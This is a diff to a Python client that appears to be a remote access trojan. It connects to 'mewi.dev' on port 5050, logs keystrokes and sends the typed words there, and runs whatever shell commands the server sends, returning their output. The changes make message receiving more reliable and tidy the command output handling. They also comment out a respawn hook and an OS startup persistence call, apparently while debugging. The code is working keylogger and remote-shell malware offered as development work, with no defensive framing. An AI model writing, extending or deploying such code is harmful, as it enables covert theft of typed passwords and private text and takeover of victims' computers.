@@ -49,10 +49,23 @@ class Client:
         self.client.send(encoded_message)
 
     def receive_message(self, connection: socket.socket):
-        header = connection.recv(self.header_length).decode(self.message_encoding)
+        remaining_header_bytes = self.header_length
+        header = ""
+        while remaining_header_bytes:
+            encoded_header_chunk = connection.recv(remaining_header_bytes)
+            remaining_header_bytes -= len(encoded_header_chunk)
+            header += encoded_header_chunk.decode(self.message_encoding)
+
         if not header:
+            self.debug_message("WARNING", "Zero bytes recieved")
             return
-        message = connection.recv(int(header)).decode(self.message_encoding)
+
+        remaining_message_bytes = int(header)
+        message = ""
+        while remaining_message_bytes:
+            encoded_message = connection.recv(remaining_message_bytes)
+            remaining_message_bytes -= len(encoded_message)
+            message += encoded_message.decode(self.message_encoding)
         return message
 
     def key_logger(self):
@@ -75,7 +88,7 @@ class Client:
 
                     prefix = "_" if key == "space" else "↴"
                     self.send_message(f"r{prefix} {''.join(word)}")
-                    self.send_message(f"p{prefix} {''.join(word_processed)}")
+                    self.send_message(f"p{prefix} {''.join(word_processed) or ' '}")
                     self.debug_message("KEYLOGGER",
                                        f"Sending keys to {self.host}:{self.port}: {prefix}r/p | {''.join(word)} / {''.join(word_processed)}")
                     break
@@ -133,8 +146,6 @@ class Client:
         except IndexError:
             arguments = []
 
-        print(command, arguments)
-
         if instruction == self.stop_message:
             self.disconnect()
 
@@ -143,9 +154,12 @@ class Client:
             self.debug_message("EXECUTING", f"Executing: {command}")
             try:
                 response = subprocess.check_output(command, shell=True, encoding=self.message_encoding, errors="ignore")
-                self.send_message(response)
-                self.debug_message("COMMAND OUTPUT", f"{response}")
-                self.debug_message("SENDING OUTPUT", f"Sending command output to {self.host}:{self.port}")
+                if response:
+                    self.send_message(response)
+                    self.debug_message("COMMAND OUTPUT", f"{response}")
+                    self.debug_message("SENDING OUTPUT", f"Sending command output to {self.host}:{self.port}")
+                    return
+                self.debug_message("COMMAND OUTPUT", "No command output")
             except subprocess.CalledProcessError as e:
                 self.debug_message("WARNING", f"Command error: {e}")
 
@@ -264,7 +278,7 @@ class PackageManager:
             raise Exception(f"{package=} does not exist")
 
 
-@atexit.register
+# @atexit.register
 def respawn():
     if not client.stop_message:
         client.disconnect()
@@ -311,7 +325,7 @@ if __name__ == "__main__":
     PackageManager.install_package("keyboard")
     import keyboard
 
-    set_os_startup_launch()
+    # set_os_startup_launch()
 
     client = Client("mewi.dev", 5050, debug=True)
     client.start()
